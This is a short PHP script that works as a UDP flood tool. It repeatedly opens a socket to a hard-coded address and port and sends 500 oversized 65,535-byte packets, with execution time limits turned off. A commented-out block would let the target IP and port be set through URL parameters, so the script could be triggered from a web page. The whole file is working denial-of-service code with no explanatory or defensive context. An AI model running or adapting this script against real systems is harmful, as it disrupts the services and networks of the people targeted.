<?php
/*
$ip = $_GET['ip'];
$port = $_GET['port'];
*/

$ip = '192.168.3.30';
$port = 800;
$num = 500;

$packets = 0;
set_time_limit(0);
ignore_user_abort(FALSE);
$time = time();
$data = '';

for($i=0;$i<65535;$i++){
        $data .= ".";
}

print "Starting.....<br>";
while($packets < $num){
	$fp = fsockopen("udp://$ip", $port, $errno, $errstr, 5);
	if($fp){
		fwrite($fp, $data);
		fclose($fp);
	}
	$packets++;
}
print('Package: '.$packets);
